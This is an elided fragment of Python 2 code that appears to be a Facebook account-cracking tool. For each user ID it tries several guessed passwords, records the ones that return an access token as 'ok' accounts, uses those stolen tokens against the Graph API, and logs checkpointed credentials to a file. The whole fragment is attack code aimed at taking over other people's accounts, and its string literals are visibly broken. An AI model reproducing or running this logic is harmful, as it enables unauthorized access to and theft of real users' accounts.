	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in w:
				...
				z = json.loads(x.text)
				print '\033[1;92m --> ' + user + '|' + pass1 + '
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in w['error_msg']:
					print '\033[1;93m --> ' + user + '|' + pass1 + '
					...
					if 'access_token' in w:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\033[1;92m --> ' + user + '|' + pass2 + '
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in w['error_msg']:
							print '\033[1;93m --> ' + user + '|' + pass2 + '
							cek = open("out/super_cp.txt", "a")
							cek.write("\nID:" +user+ " Pw:" +pass2+ ")
							cek.close()
							...
							if 'access_token' in w:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
								z = json.loads(x.text)
								print '\033[1;92m --> ' + user + '|' + pass3 + '
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in w['error_msg']:
									print '\033[1;93m --> ' + user + '|' + pass3 + '
									cek = open("out/super_cp.txt", "a")
									cek.write("\nID:" +user+ " Pw:" +pass3+ ")
									cek.close()
